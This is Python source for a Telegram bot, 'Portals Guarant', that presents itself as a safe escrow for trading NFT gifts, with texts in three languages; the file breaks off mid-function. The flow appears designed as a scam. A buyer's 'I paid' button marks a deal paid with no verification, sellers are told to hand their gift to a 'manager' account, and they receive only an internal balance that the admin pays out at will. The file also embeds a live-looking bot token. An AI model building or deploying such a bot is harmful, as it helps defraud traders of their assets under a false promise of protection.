import asyncio
import logging
import json
import os
import random
import string
import re
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart, CommandObject, Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# --- НАСТРОЙКИ ---
BOT_TOKEN = "9264454314:AAGu6P1Xp0_zJvWLh_NhpKM0mrGr6x93uRE"
MAIN_ADMIN_ID = 8941873700
SETTINGS_FILE = "settings.json"
DEALS_FILE = "deals.json"
USERS_FILE = "users.json"
BALANCES_FILE = "balances.json"
WITHDRAW_FILE = "withdraw_requests.json"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

LINK_PORTALS = "https://t.me/portals?startapp="
LINK_SUPPORT = "https://t.me/Portalldeal"

# --- ТЕКСТЫ ---
TEXTS = {
    "ru": {
        "welcome": "<b>Portals Guarant - #1 По трейдингу NFT подарков.</b>\n\nПокупайте и продавайте всё, что угодно — безопасно.\n\n👇 <b>Выберите раздел:</b>",
        "lang_select": "🌐 <b>Выберите язык:</b>",
        "btn_create": "Создать сделку",
        "btn_wallet": "Кошелек",
        "btn_my_deals": "Мои сделки",
        "btn_market": "Portals Market",
        "btn_lang": "Язык",
        "btn_support": "Поддержка",
        "btn_back": "Назад",
        "btn_main": "В главное меню",
        "btn_pay": "Я оплатил",
        "btn_delivered": "Я передал подарок",
        "btn_admin_confirm": "Подтвердить получение",
        "lang_changed": "Язык изменен на Русский!",
        "choose_method": "<b>Выберите метод оплаты:</b>",
        "method_wallet": "Кошелек (USDT, TON)",
        "method_card": "Карта (RUB, UAH)",
        "method_stars": "Звезды (Stars)",
        "amount_wallet": "<b>Введите сумму сделки в USDT или TON.</b>\n\nПример: 10.5 USDT или 4 TON",
        "amount_card": "<b>Введите сумму сделки в RUB или UAH.</b>\n\nПример: 1000 RUB или 500 UAH",
        "amount_stars": "<b>Введите сумму сделки в Stars.</b>\n\nПример: 150 Stars",
        "amount_error_wallet": "Не понял. Введите число и валюту (например: 10 USDT или 2 TON).",
        "amount_error_card": "Не понял. Введите число и валюту (например: 1000 RUB).",
        "amount_error_stars": "Не понял. Введите число и Stars (например: 100 Stars).",
        "prompt_ton": "Введите адрес вашего TON кошелька:",
        "prompt_usdt": "Введите адрес вашего USDT кошелька:",
        "prompt_card": "Введите номер карты для получения:",
        "prompt_stars": "Введите свой @username для получения звезд:",
        "enter_nft": "<b>Ссылка на NFT</b>\n\nОтправьте ссылку (t.me/nft/...):",
        "deal_success": "<b>Сделка успешно создана!</b>\n\nНомер: <code>{deal_id}</code>\nСумма: {amount}\n\nРеквизиты: {details}\nПодарок: {nft_link}\n\nСсылка для покупателя:\n{deal_link}",
        "deal_offer": "<b>Вам предложена сделка!</b>\n\nНомер: <code>{deal_id}</code>\nСумма: {amount}\n\n<b>Реквизиты:</b>\n<code>{details}</code>\n\nПереведите сумму и нажмите кнопку.",
        "buyer_paid": "<b>Вы оплатили сделку!</b>\n\nОжидайте передачу подарка менеджеру.\n\nВ случае не передачи подарка будет сделан возврат средств.",
        "seller_paid_notify": "<b>Покупатель оплатил сделку {deal_id}!</b>\n\n<b>Передайте подарок менеджеру @Portalldeal для получения оплаты.</b>",
        "seller_wait_confirm": "<b>Вы подтвердили передачу подарка!</b>\n\nОжидайте подтверждение передачи NFT от менеджера.",
        "buyer_delivered": "<b>Подарок передан менеджеру!</b>\n\nОжидайте проверки и получения средств продавцом.",
        "seller_final_success": "<b>Сделка {deal_id} успешно завершена!</b>\n\nСредства зачислены на ваш баланс.",
        "buyer_final_success": "<b>Сделка {deal_id} успешно завершена!</b>\n\nСредства переведены продавцу. Спасибо за использование нашего сервиса!",
        "admin_new_deal": "<b>Новая сделка создана!</b>\n\nНомер: <code>{deal_id}</code>\nСумма: {amount}\nРеквизиты: <code>{details}</code>\n\n<a href='{deal_link}'>Ссылка для покупателя</a>",
        "admin_deal_paid": "<b>Сделка {deal_id} оплачена покупателем!</b>\n\nПродавец уведомлен. Ожидайте передачи подарка.",
        "admin_deal_delivered": "<b>Продавец подтвердил передачу подарка {deal_id}!</b>\n\nПроверьте поступление подарка и нажмите кнопку подтверждения.",
        "admin_confirmed": "<b>Вы подтвердили получение подарка {deal_id}!</b>\n\nСредства начислены на баланс продавца.",
        "wallet_text": "<b>Ваш кошелек</b>\n\nБаланс: {balance}\n\nВ сделках: {in_deals}",
        "btn_withdraw": "Вывести средства",
        "no_deals": "У вас нет сделок.",
        "deals_title": "<b>Ваши последние сделки:</b>\n\n",
        "error_link": "Отправьте ссылку (t.me/nft/...).",
        "error_deal": "Сделка не найдена или уже оплачена!",
        "withdraw_prompt": "Введите сумму для вывода:",
        "withdraw_success": "✅ Заявка на вывод {amount} создана! Ожидайте выплаты от администратора.",
        "withdraw_error": "Недостаточно средств на балансе.",
        "withdraw_notify_admin": "<b>🔔 Новая заявка на вывод!</b>\n\nПользователь: {name} (ID: <code>{uid}</code>)\nСумма: {amount}\n\nНажмите кнопку ниже, чтобы подтвердить выплату."
    },
    "en": {
        "welcome": "<b>Portals Guarant - #1 NFT Gifts Trading.</b>\n\nBuy and sell anything — safely.\n\n👇 <b>Select section:</b>",
        "lang_select": "🌐 <b>Select language:</b>",
        "btn_create": "Create deal",
        "btn_wallet": "Wallet",
        "btn_my_deals": "My deals",
        "btn_market": "Portals Market",
        "btn_lang": "Language",
        "btn_support": "Support",
        "btn_back": "Back",
        "btn_main": "Main menu",
        "btn_pay": "I paid",
        "btn_delivered": "I handed over the gift",
        "btn_admin_confirm": "Confirm receipt",
        "lang_changed": "Language changed to English!",
        "choose_method": "<b>Select payment method:</b>",
        "method_wallet": "Wallet (USDT, TON)",
        "method_card": "Card (RUB, UAH)",
        "method_stars": "Stars",
        "amount_wallet": "<b>Enter deal amount in USDT or TON.</b>\n\nExample: 10.5 USDT or 4 TON",
        "amount_card": "<b>Enter deal amount in RUB or UAH.</b>\n\nExample: 1000 RUB or 500 UAH",
        "amount_stars": "<b>Enter deal amount in Stars.</b>\n\nExample: 150 Stars",
        "amount_error_wallet": "Could not parse. Enter number and currency (e.g., 10 USDT or 2 TON).",
        "amount_error_card": "Could not parse. Enter number and currency (e.g., 1000 RUB).",
        "amount_error_stars": "Could not parse. Enter number and Stars (e.g., 100 Stars).",
        "prompt_ton": "Enter your TON wallet address:",
        "prompt_usdt": "Enter your USDT wallet address:",
        "prompt_card": "Enter card number for receiving:",
        "prompt_stars": "Enter your @username to receive Stars:",
        "enter_nft": "<b>NFT Link</b>\n\nSend link (t.me/nft/...):",
        "deal_success": "<b>Deal successfully created!</b>\n\nNumber: <code>{deal_id}</code>\nAmount: {amount}\n\nDetails: {details}\nGift: {nft_link}\n\nLink for buyer:\n{deal_link}",
        "deal_offer": "<b>You are offered a deal!</b>\n\nNumber: <code>{deal_id}</code>\nAmount: {amount}\n\n<b>Details:</b>\n<code>{details}</code>\n\nTransfer the amount and press the button.",
        "buyer_paid": "<b>You paid for the deal!</b>\n\nWait for the gift transfer to the manager.\n\nIf the gift is not transferred, a refund will be made.",
        "seller_paid_notify": "<b>Buyer paid for deal {deal_id}!</b>\n\n<b>Hand over the gift to manager @Portalldeal to receive payment.</b>",
        "seller_wait_confirm": "<b>You confirmed the gift transfer!</b>\n\nWait for the manager to confirm the NFT receipt.",
        "buyer_delivered": "<b>Gift handed over to the manager!</b>\n\nWait for verification and receipt of funds by the seller.",
        "seller_final_success": "<b>Deal {deal_id} successfully completed!</b>\n\nFunds have been credited to your balance.",
        "buyer_final_success": "<b>Deal {deal_id} successfully completed!</b>\n\nFunds transferred to the seller. Thank you for using our service!",
        "admin_new_deal": "<b>New deal created!</b>\n\nNumber: <code>{deal_id}</code>\nAmount: {amount}\nDetails: <code>{details}</code>\n\n<a href='{deal_link}'>Buyer link</a>",
        "admin_deal_paid": "<b>Deal {deal_id} paid by buyer!</b>\n\nSeller notified. Awaiting gift transfer.",
        "admin_deal_delivered": "<b>Seller confirmed gift transfer {deal_id}!</b>\n\nCheck the gift receipt and click confirm.",
        "admin_confirmed": "<b>You confirmed receipt of gift {deal_id}!</b>\n\nFunds credited to seller's balance.",
        "wallet_text": "<b>Your wallet</b>\n\nBalance: {balance}\n\nIn deals: {in_deals}",
        "btn_withdraw": "Withdraw funds",
        "no_deals": "You have no deals.",
        "deals_title": "<b>Your last deals:</b>\n\n",
        "error_link": "Send a link (t.me/nft/...).",
        "error_deal": "Deal not found or already paid!",
        "withdraw_prompt": "Enter amount to withdraw:",
        "withdraw_success": "✅ Withdrawal request for {amount} created! Await payout from admin.",
        "withdraw_error": "Insufficient balance.",
        "withdraw_notify_admin": "<b>🔔 New withdrawal request!</b>\n\nUser: {name} (ID: <code>{uid}</code>)\nAmount: {amount}\n\nClick the button below to confirm payout."
    },
    "ua": {
        "welcome": "<b>Portals Guarant - #1 З торгівлі NFT подарунками.</b>\n\nКупуйте та продавайте все — безпечно.\n\n👇 <b>Оберіть розділ:</b>",
        "lang_select": "🌐 <b>Оберіть мову:</b>",
        "btn_create": "Створити угоду",
        "btn_wallet": "Гаманець",
        "btn_my_deals": "Мої угоди",
        "btn_market": "Portals Market",
        "btn_lang": "Мова",
        "btn_support": "Підтримка",
        "btn_back": "Назад",
        "btn_main": "Головне меню",
        "btn_pay": "Я оплатив",
        "btn_delivered": "Я передав подарунок",
        "btn_admin_confirm": "Підтвердити отримання",
        "lang_changed": "Мову змінено на Українську!",
        "choose_method": "<b>Оберіть метод оплати:</b>",
        "method_wallet": "Гаманець (USDT, TON)",
        "method_card": "Картка (RUB, UAH)",
        "method_stars": "Зірки (Stars)",
        "amount_wallet": "<b>Введіть суму угоди в USDT або TON.</b>\n\nПриклад: 10.5 USDT або 4 TON",
        "amount_card": "<b>Введіть суму угоди в RUB або UAH.</b>\n\nПриклад: 1000 RUB або 500 UAH",
        "amount_stars": "<b>Введіть суму угоди в Stars.</b>\n\nПриклад: 150 Stars",
        "amount_error_wallet": "Не зрозумів. Введіть число та валюту (наприклад: 10 USDT або 2 TON).",
        "amount_error_card": "Не зрозумів. Введіть число та валюту (наприклад: 1000 RUB).",
        "amount_error_stars": "Не зрозумів. Введіть число та Stars (наприклад: 100 Stars).",
        "prompt_ton": "Введіть адресу свого TON гаманця:",
        "prompt_usdt": "Введіть адресу свого USDT гаманця:",
        "prompt_card": "Введіть номер картки для отримання:",
        "prompt_stars": "Введіть свій @username для отримання зірок:",
        "enter_nft": "<b>Посилання на NFT</b>\n\nНадішліть посилання (t.me/nft/...):",
        "deal_success": "<b>Угоду успішно створено!</b>\n\nНомер: <code>{deal_id}</code>\nСума: {amount}\n\nРеквізити: {details}\nПодарунок: {nft_link}\n\nПосилання для покупця:\n{deal_link}",
        "deal_offer": "<b>Вам запропоновано угоду!</b>\n\nНомер: <code>{deal_id}</code>\nСума: {amount}\n\n<b>Реквізити:</b>\n<code>{details}</code>\n\nПерекажіть суму та натисніть кнопку.",
        "buyer_paid": "<b>Ви оплатили угоду!</b>\n\nОчікуйте передачу подарунка менеджеру.\n\nУ разі не передачі подарунка буде зроблено повернення коштів.",
        "seller_paid_notify": "<b>Покупець оплатив угоду {deal_id}!</b>\n\n<b>Передайте подарунок менеджеру @Portalldeal для отримання оплати.</b>",
        "seller_wait_confirm": "<b>Ви підтвердили передачу подарунка!</b>\n\nОчікуйте підтвердження передачі NFT від менеджера.",
        "buyer_delivered": "<b>Подарунок передано менеджеру!</b>\n\nОчікуйте перевірки та отримання коштів продавцем.",
        "seller_final_success": "<b>Угоду {deal_id} успішно завершено!</b>\n\nКошти зараховано на ваш баланс.",
        "buyer_final_success": "<b>Угоду {deal_id} успішно завершено!</b>\n\nКошти переведено продавцю. Дякуємо за використання нашого сервісу!",
        "admin_new_deal": "<b>Створено нову угоду!</b>\n\nНомер: <code>{deal_id}</code>\nСума: {amount}\nРеквізити: <code>{details}</code>\n\n<a href='{deal_link}'>Посилання для покупця</a>",
        "admin_deal_paid": "<b>Угоду {deal_id} оплачено покупцем!</b>\n\nПродавця повідомлено. Очікуйте передачі подарунка.",
        "admin_deal_delivered": "<b>Продавець підтвердив передачу подарунка {deal_id}!</b>\n\nПеревірте отримання подарунка та натисніть кнопку.",
        "admin_confirmed": "<b>Ви підтвердили отримання подарунка {deal_id}!</b>\n\nКошти зараховано на баланс продавця.",
        "wallet_text": "<b>Ваш гаманець</b>\n\nБаланс: {balance}\n\nВ угодах: {in_deals}",
        "btn_withdraw": "Вивести кошти",
        "no_deals": "У вас немає угод.",
        "deals_title": "<b>Ваші останні угоди:</b>\n\n",
        "error_link": "Надішліть посилання (t.me/nft/...).",
        "error_deal": "Угоду не знайдено або вже оплачено!",
        "withdraw_prompt": "Введіть суму для виведення:",
        "withdraw_success": "✅ Заявку на виведення {amount} створено! Очікуйте виплати від адміністратора.",
        "withdraw_error": "Недостатньо коштів на балансі.",
        "withdraw_notify_admin": "<b>🔔 Нова заявка на виведення!</b>\n\nКористувач: {name} (ID: <code>{uid}</code>)\nСума: {amount}\n\nНатисніть кнопку нижче, щоб підтвердити виплату."
    }
}

class DealStates(StatesGroup):
    entering_amount = State()
    entering_details = State()
    entering_nft_link = State()
    entering_withdraw = State()

class AdminStates(StatesGroup):
    waiting_for_choice = State()
    waiting_for_new_value = State()

def get_json(filename, default):
    if not os.path.exists(filename): return default
    with open(filename, "r", encoding="utf-8") as f:
        return json.load(f)

def save_json(filename, data):
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

def get_settings(): return get_json(SETTINGS_FILE, {"texts": {}, "images": {}, "entities": {}, "admins": []})
def save_settings(d): save_json(SETTINGS_FILE, d)

def get_users(): return get_json(USERS_FILE, {})
def get_user_lang(uid): return get_users().get(str(uid), "ru")
def set_user_lang(uid, lang):
    u = get_users(); u[str(uid)] = lang; save_json(USERS_FILE, u)

def get_balances(): return get_json(BALANCES_FILE, {})
def save_balances(b): save_json(BALANCES_FILE, b)

def add_balance(user_id, currency, amount):
    b = get_balances()
    uid = str(user_id)
    if uid not in b: b[uid] = {}
    if currency not in b[uid]: b[uid][currency] = 0.0
    b[uid][currency] += amount
    save_json(BALANCES_FILE, b)

def deduct_balance(user_id, currency, amount):
    b = get_balances()
    uid = str(user_id)
    if uid in b and currency in b[uid]:
        if b[uid][currency] >= amount:
            b[uid][currency] -= amount
            save_json(BALANCES_FILE, b)
            return True
    return False

def t(uid, key, **kwargs):
    lang = get_user_lang(uid)
    txt = TEXTS.get(lang, TEXTS["ru"]).get(key, "")
    return txt.format(**kwargs) if kwargs else txt

def is_admin(uid): return uid == MAIN_ADMIN_ID or uid in get_settings().get("admins", [])

def get_deals(): return get_json(DEALS_FILE, [])
def save_deals(d): save_json(DEALS_FILE, d)

def generate_deal_id(): return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(7))

def find_deal(did):
    for d in get_deals():
        if d["deal_id"] == did: return d
    return None

def update_deal(did, updates):
    deals = get_deals()
    for d in deals:
        if d["deal_id"] == did:
            d.update(updates)
            break
    save_deals(deals)

async def send_screen(chat_id, uid, text_key, reply_markup, edit_message=None, **kwargs):
    settings = get_settings()
    text = settings.get("texts", {}).get(text_key)
    if not text: text = t(uid, text_key, **kwargs)
    elif kwargs: text = text.format(**kwargs)

    photo = settings.get("images", {}).get(text_key)
    entities = settings.get("entities", {}).get(text_key)

    if edit_message:
        try: await edit_message.delete()
        except: pass

    if photo:
        if entities: await bot.send_photo(chat_id=chat_id, photo=photo, caption=text, caption_entities=entities, reply_markup=reply_markup)
        else: await bot.send_photo(chat_id=chat_id, photo=photo, caption=text, parse_mode="HTML", reply_markup=reply_markup)
    else:
        if entities: await bot.send_message(chat_id=chat_id, text=text, entities=entities, reply_markup=reply_markup)
        else: await bot.send_message(chat_id=chat_id, text=text, parse_mode="HTML", reply_markup=reply_markup)

def get_main_keyboard(uid):
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text=t(uid, "btn_create"), callback_data="create_deal"))
    b.row(InlineKeyboardButton(text=t(uid, "btn_wallet"), callback_data="wallet"), InlineKeyboardButton(text=t(uid, "btn_my_deals"), callback_data="my_deals"))
    b.row(InlineKeyboardButton(text=t(uid, "btn_market"), url=LINK_PORTALS))
    b.row(InlineKeyboardButton(text=t(uid, "btn_lang"), callback_data="language_menu"))
    b.row(InlineKeyboardButton(text=t(uid, "btn_support"), url=LINK_SUPPORT))
    if is_admin(uid): b.row(InlineKeyboardButton(text="⚙️ Админ-панель", callback_data="admin_panel"))
    return b.as_markup()

def get_language_keyboard(uid):
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="🇷🇺 Русский", callback_data="set_lang_ru"), InlineKeyboardButton(text="🇬🇧 English", callback_data="set_lang_en"), InlineKeyboardButton(text="🇺🇦 Українська", callback_data="set_lang_ua"))
    b.row(InlineKeyboardButton(text=t(uid, "btn_back"), callback_data="back_to_main"))
    return b.as_markup()

def get_methods_keyboard(uid):
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text=t(uid, "method_wallet"), callback_data="method_wallet"))
    b.row(InlineKeyboardButton(text=t(uid, "method_card"), callback_data="method_card"))
    b.row(InlineKeyboardButton(text=t(uid, "method_stars"), callback_data="method_stars"))
    b.row(InlineKeyboardButton(text=t(uid, "btn_back"), callback_data="back_to_main"))
    return b.as_markup()

@dp.message(CommandStart(deep_link=True))
async def cmd_start_deep_link(message: types.Message, command: CommandObject, state: FSMContext):
    await state.clear()
    if command.args:
        deal = find_deal(command.args)
        if deal and deal["status"] == "Ожидает оплаты":
            update_deal(command.args, {"buyer_id": message.from_user.id})
            kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=t(message.from_user.id, "btn_pay"), callback_data=f"pay_{deal['deal_id']}")], [InlineKeyboardButton(text=t(message.from_user.id, "btn_main"), callback_data="back_to_main")]])
            await send_screen(message.chat.id, message.from_user.id, "deal_offer", kb, **{"deal_id": deal['deal_id'], "amount": deal['amount'], "details": deal['details']})
            return
    await send_screen(message.chat.id, message.from_user.id, "welcome", get_main_keyboard(message.from_user.id))

@dp.message(CommandStart())
async def cmd_start(message: types.Message, state: FSMContext):
    await state.clear()
    await send_screen(message.chat.id, message.from_user.id, "welcome", get_main_keyboard(message.from_user.id))

@dp.callback_query(F.data == "back_to_main")
async def back_to_main(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await send_screen(callback.message.chat.id, callback.from_user.id, "welcome", get_main_keyboard(callback.from_user.id), edit_message=callback.message)
    await callback.answer()

@dp.callback_query(F.data == "language_menu")
async def language_menu(callback: types.CallbackQuery):
    await send_screen(callback.message.chat.id, callback.from_user.id, "lang_select", get_language_keyboard(callback.from_user.id), edit_message=callback.message)
    await callback.answer()

@dp.callback_query(F.data.startswith("set_lang_"))
async def set_language(callback: types.CallbackQuery):
    lang = callback.data.split("_")[2]
    set_user_lang(callback.from_user.id, lang)
    await callback.answer(t(callback.from_user.id, "lang_changed"), show_alert=True)
    await send_screen(callback.message.chat.id, callback.from_user.id, "welcome", get_main_keyboard(callback.from_user.id), edit_message=callback.message)

@dp.callback_query(F.data == "create_deal")
async def start_deal(callback: types.CallbackQuery, state: FSMContext):
    await state.clear() 
    await send_screen(callback.message.chat.id, callback.from_user.id, "choose_method", get_methods_keyboard(callback.from_user.id), edit_message=callback.message)
    await callback.answer()

@dp.callback_query(F.data.in_({"method_wallet", "method_card", "method_stars"}))
async def choose_method(callback: types.CallbackQuery, state: FSMContext):
    method = callback.data.replace("method_", "")
    await state.update_data(method=method)
    text_key = "amount_wallet" if method == "wallet" else "amount_card" if method == "card" else "amount_stars"
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=t(callback.from_user.id, "btn_back"), callback_data="create_deal")]])
    await send_screen(callback.message.chat.id, callback.from_user.id, text_key, kb, edit_message=callback.message)
    await state.set_state(DealStates.entering_amount)
    await callback.answer()

def parse_amount(text, method):
    text = text.lower().replace(",", ".")
    match = re.search(r'([\d\.]+)\s*([a-zа-яё$]*)?', text)
    if not match: return None, None
    try: amount = float(match.group(1))
    except: return None, None
    c = match.group(2) if match.group(2) else ""
    if method == "wallet":
        if "ton" in c: return amount, "TON"
        elif "usdt" in c or "$" in c or not c: return amount, "USDT"
    elif method == "card":
        if "rub" in c or "р" in c or not c: return amount, "RUB"
        elif "uah" in c or "грн" in c: return amount, "UAH"
    elif method == "stars":
        if "star" in c or "звезд" in c or "зір" in c or not c: return amount, "Stars"
    return None, None

@dp.message(DealStates.entering_amount)
async def process_amount(message: types.Message, state: FSMContext):
    data = await state.get_data()
    method = data.get("method")
    amount, currency = parse_amount(message.text, method)
    if amount is None:
        err_key = "amount_error_wallet" if method == "wallet" else "amount_error_card" if method == "card" else "amount_error_stars"
        return await message.answer(t(message.from_user.id, err_key))
    await state.update_data(amount=amount, currency=currency)
    prompt_key = "prompt_ton" if currency=="TON" else "prompt_usdt" if currency=="USDT" else "prompt_card" if currency in ["RUB","UAH"] else "prompt_stars"
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=t(message.from_user.id, "btn_back"), callback_data="create_deal")]])
    await send_screen(message.chat.id, message.from_user.id, prompt_key, kb)
    await state.set_state(DealStates.entering_details)

@dp.message(DealStates.entering_details)
async def process_details(message: types.Message, state: FSMContext):
    await state.update_data(details=message.text)
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=t(message.from_user.id, "btn_back"), callback_data="create_deal")]])
    await send_screen(message.chat.id, message.from_user.id, "enter_nft", kb)
    await state.set_state(DealStates.entering_nft_link)

@dp.message(DealStates.entering_nft_link)
async def process_nft_link(message: types.Message, state: FSMContext):
    if "t.me/nft/" not in message.text: return await message.answer(t(message.from_user.id, "error_link"))
    data = await state.get_data()
    did = generate_deal_id()
    bot_info = await bot.get_me()
    deal_link = f"https://t.me/{bot_info.username}?start={did}"
    amount_str = f"{data['amount']} {data['currency']}"
    
    deal_data = {
        "deal_id": did, "user_id": message.from_user.id, "user_name": message.from_user.full_name,
        "amount": amount_str, "currency": data["currency"], "details": data["details"],
        "nft_link": message.text, "status": "Ожидает оплаты", "date": datetime.now().strftime("%Y-%m-%d %H:%M"), "buyer_id": None
    }
    deals = get_deals()
    deals.append(deal_data)
    save_deals(deals)
    await state.clear()
    
    await send_screen(message.chat.id, message.from_user.id, "deal_success", InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=t(message.from_user.id, "btn_main"), callback_data="back_to_main")]]), deal_id=did, amount=amount_str, details=data["details"], nft_link=message.text, deal_link=deal_link)
    
    try:
        admin_text = t(MAIN_ADMIN_ID, "admin_new_deal", deal_id=did, amount=amount_str, details=data["details"], deal_link=deal_link)
        await bot.send_message(MAIN_ADMIN_ID, admin_text, parse_mode="HTML")
    except: pass

@dp.callback_query(F.data.startswith("pay_") & ~F.data.in_({"pay_wallet", "pay_card", "pay_stars"}))
async def process_payment(callback: types.CallbackQuery):
    did = callback.data.replace("pay_", "")
    deal = find_deal(did)
    if not deal or deal["status"] != "Ожидает оплаты":
        return await callback.answer(t(callback.from_user.id, "error_deal"), show_alert=True)
    update_deal(did, {"status": "Оплачено"})
    
    await send_screen(callback.message.chat.id, callback.from_user.id, "buyer_paid", InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=t(callback.from_user.id, "btn_main"), callback_data="back_to_main")]]), edit_message=callback.message)
    
    seller_text = t(deal["user_id"], "seller_paid_notify", deal_id=did)
    kb_seller = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=t(deal["user_id"], "btn_delivered"), callback_data=f"delivered_{did}")]])
    try: await bot.send_message(deal["user_id"], seller_text, reply_markup=kb_seller, parse_mode="HTML")
    except: pass
    
    try: await bot.send_message(MAIN_ADMIN_ID, t(MAIN_ADMIN_ID, "admin_deal_paid", deal_id=did), parse_mode="HTML")
    except: pass
    await callback.answer()

# --- ПЕРЕДАЧА ПОДАРКА (Продавец) ---
@dp.callback_query(F.data.startswith("delivered_"))
async def process_delivered(callback: types.CallbackQuery):
    did = callback.data.replace("delivered_", "")
    deal = find_deal(did)
    if not deal: return await callback.answer("Сделка не найдена.")
    
    # Ставим статус "На проверке"
    update_deal(did, {"status": "На проверке"})
    
    # Продавцу приходит сообщение ОЖИДАНИЯ (как ты просил)
    await send_screen(callback.message.chat.id, callback.from_user.id, "seller_wait_confirm", InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=t(callback.from_user.id, "btn_main"), callback_data="back_to_main")]]), edit_message=callback.message)
    
    # Админу приходит кнопка подтверждения
    admin_text = t(MAIN_ADMIN_ID, "admin_deal_delivered", deal_id=did)
    kb_admin = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=t(MAIN_ADMIN_ID, "btn_admin_confirm"), callback_data=f"admin_confirm_{did}")]])
    try: await bot.send_message(MAIN_ADMIN_ID, admin_text, reply_markup=kb_admin, parse_mode="HTML")
    except: pass

# --- ПОДТВЕРЖДЕНИЕ АДМИНА ---
@dp.callback_query(F.data.startswith("admin_confirm_"))
async def admin_confirm(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id): return await callback.answer("Нет доступа.", show_alert=True)
    did = callback.data.replace("admin_confirm_", "")
    deal = find_deal(did)
    if not deal or deal["status"] != "На проверке": return await callback.answer("Сделка не найдена или уже завершена.")
    
    # Ставим финальный статус
    update_deal(did, {"status": "Завершено"})
    
    # Начисляем баланс продавцу
    amount_val = float(deal["amount"].split()[0])
    add_balance(deal["user_id"], deal["currency"], amount_val)
    
    # Тебе (Админу)
    await callback.message.edit_text(t(callback.from_user.id, "admin_confirmed", deal_id=did), parse_mode="HTML")
    
    # ПРОДАВЦУ (Финальный успех)
    try:
        seller_final = t(deal["user_id"], "seller_final_success", deal_id=did)
        await bot.send_message(deal["user_id"], seller_final, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=t(deal["user_id"], "btn_main"), callback_data="back_to_main")]]), parse_mode="HTML")
    except: pass
    
    # ПОКУПАТЕЛЮ (Финальный успех)
    if deal.get("buyer_id"):
        try:
            buyer_final = t(deal["buyer_id"], "buyer_final_success", deal_id=did)
            await bot.send_message(deal["buyer_id"], buyer_final, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=t(deal["buyer_id"], "btn_main"), callback_data="back_to_main")]]), parse_mode="HTML")
        except: pass

# --- КОШЕЛЕК И ВЫВОД ---
@dp.callback_query(F.data == "wallet")
async def wallet_menu(callback: types.CallbackQuery):
    uid = callback.from_user.id
    bal = get_balances().get(str(uid), {})
    bal_str = ", ".join([f"{v:.2f} {k}" for k, v in bal.items()]) if bal else "0.00"
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=t(uid, "btn_withdraw"), callback_data="withdraw_money")], [InlineKeyboardButton(text=t(uid, "btn_main"), callback_data="back_to_main")]])
    await send_screen(callback.message.chat.id, uid, "wallet_text", kb, edit_message=callback.message, balance=bal_str, in_deals="0.00")

@dp.callback_query(F.data == "withdraw_money")
async def start_withdraw(callback: types.CallbackQuery, state: FSMContext):
    bal = get_balances().get(str(callback.from_user.id), {})
    if not bal:
        return await callback.answer(t(callback.from_user.id, "withdraw_error"), show_alert=True)
    await callback.message.edit_text(t(callback.from_user.id, "withdraw_prompt"))
    await state.set_state(DealStates.entering_withdraw)
    await callback.answer()

@dp.message(DealStates.entering_withdraw)
async def process_withdraw(message: types.Message, state: FSMContext):
    uid = message.from_user.id
    text = message.text.lower().replace(",", ".")
    match = re.search(r'([\d\.]+)\s*([a-zа-яё]*)?', text)
    if not match: return await message.answer("Ошибка формата. Введите сумму (например: 10 USDT)")
    amount = float(match.group(1))
    currency = match.group(2).upper() if match.group(2) else "USDT"
    
    bal = get_balances().get(str(uid), {})
    if currency not in bal or bal[currency] < amount:
        return await message.answer(t(uid, "withdraw_error"))
        
    if deduct_balance(uid, currency, amount):
        reqs = get_json(WITHDRAW_FILE, [])
        req_id = generate_deal_id()
        reqs.append({"req_id": req_id, "user_id": uid, "user_name": message.from_user.full_name, "amount": f"{amount} {currency}", "status": "Ожидает выплаты", "date": datetime.now().strftime("%Y-%m-%d %H:%M")})
        save_json(WITHDRAW_FILE, reqs)
        
        await message.answer(t(uid, "withdraw_success", amount=f"{amount} {currency}"), reply_markup=get_main_keyboard(uid))
        
        admin_text = t(MAIN_ADMIN_ID, "withdraw_notify_admin", name=message.from_user.full_name, uid=uid, amount=f"{amount} {currency}")
        kb_admin = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="✅ Выплачено", callback_data=f"admin_payout_{req_id}")], [InlineKeyboardButton(text="❌ Отклонить", callback_data=f"admin_reject_{req_id}")]])
        try: await bot.send_message(MAIN_ADMIN_ID, admin_text, reply_markup=kb_admin, parse_mode="HTML")
        except: pass
    await state.clear()

@dp.callback_query(F.data.startswith("admin_payout_") | F.data.startswith("admin_reject_"))
async def process_admin_withdraw(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id): return await callback.answer("Нет доступа.", show_alert=True)
    action = "payout" if "payout" in callback.data else "reject"
    req_id = callback.data.split("_")[-1]
    reqs = get_json(WITHDRAW_FILE, [])
    for r in reqs:
        if r["req_id"] == req_id and r["status"] == "Ожидает выплаты":
            if action == "payout":
                r["status"] = "Выплачено"; save_json(WITHDRAW_FILE, reqs)
                await callback.message.edit_text(f"✅ Заявка {req_id} выплачена.")
